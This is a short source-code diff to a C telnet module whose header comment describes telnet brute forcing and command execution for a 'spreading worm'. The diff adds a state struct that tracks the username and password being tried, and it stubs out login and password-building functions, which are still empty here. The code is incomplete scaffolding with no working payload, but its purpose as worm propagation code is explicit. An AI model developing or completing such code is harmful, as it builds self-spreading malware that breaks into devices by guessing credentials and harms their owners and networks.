@@ -13,6 +13,7 @@ telnet brute forcing, and command execution (spreading worm)
 #include "../../utils.h"
 #include "telnet.h"
 
+typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);
 
 int telnet_init(Modules **);
 
@@ -41,6 +42,16 @@ Modules HACK_Telnet = {
     // no magic bytes for telnet
     NULL, 0
 };
+
+// customstate goes in connection->buf (for keeping track of brute force, etc)
+typedef struct _custom_state {
+    // what username are we on..
+    int username;
+    // what password are we on?
+    int password;
+    // seconds since last expect
+    unsigned int ts;
+} CustomState ;
 
 
 // initialize the module
@@ -83,15 +94,15 @@ int telnet_write(Modules *mptr, Connection *cptr, char **_buf, int *_size) {
     return 0;
 }
 
-typedef char *(*ExpectCMD)(Modules *, Connection *, int *size);
+
 
 char *BuildLogin(Modules *mptr, Connection *cptr, int *size) {
-    
+    char *ret = NULL;
 }
 
 
 char *BuildPassword(Modules *mptr, Connection *cptr, int *size) {
-    
+    char *ret = NULL;
 }
 
 char *BuildVerify(Modules *mptr, Connection *cptr, int *size) {
